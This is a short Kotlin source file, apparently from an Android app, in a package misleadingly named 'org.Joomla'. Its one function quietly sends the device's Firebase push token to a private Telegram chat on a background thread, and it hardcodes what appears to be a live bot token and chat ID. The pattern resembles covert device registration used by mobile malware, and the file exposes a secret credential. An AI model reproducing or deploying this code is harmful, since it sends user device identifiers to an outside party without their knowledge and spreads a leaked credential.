package org.Joomla

import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

fun sendTokenToTelegram(token: String) {
    val botToken = "8242226606:AAHV9D6M1bVmp-KqpH6oOrizppfo5T_aYcs" // Токен бота
    val chatId = "1423317158" // чат ID с ботом
    val message = "Новый FCM Token: $token"

    val urlString = "https://api.telegram.org/bot$botToken/sendMessage?" +
            "chat_id=$chatId&text=${URLEncoder.encode(message, "UTF-8")}"

    Thread {
        try {
            val url = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.inputStream.bufferedReader().use { it.readText() }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }.start()
}